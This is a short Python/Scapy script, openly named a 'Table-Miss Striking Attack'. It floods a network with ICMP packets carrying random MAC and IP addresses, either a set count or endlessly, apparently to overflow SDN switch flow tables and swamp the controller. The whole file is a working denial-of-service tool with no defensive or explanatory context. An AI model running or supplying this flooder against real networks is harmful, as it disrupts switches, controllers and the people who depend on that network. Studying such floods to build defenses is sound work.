from scapy.all import Ether, IP, ICMP, sendp, RandMAC, RandIP
import sys

# number of packets to send (default : inf)
num_packets = None
if len(sys.argv) > 1:
    try:
        num_packets = int(sys.argv[1])
    except:
        num_packets = None

print(f"[*] Launch Table-Miss Striking Attack.")

count = 0
try:
    if num_packets:

        for i in range(num_packets):
            pkt = Ether(src=RandMAC(), dst=RandMAC())/IP(src=RandIP(), dst=RandIP())/ICMP()
            sendp(pkt, verbose=False)
            count += 1
            if count % 1000 == 0:
                print(f"{count} packets sent...")

    else:
        # infinite loop
        while True:
            pkt = Ether(src=RandMAC(), dst=RandMAC())/IP(src=RandIP(), dst=RandIP())/ICMP()
            sendp(pkt, verbose=False)
            count += 1
            if count % 1000 == 0:
                print(f"{count} packets sent...")

except KeyboardInterrupt:
    print(f"\nKeyboardInterrupt. Total of sent packets : {count}.")
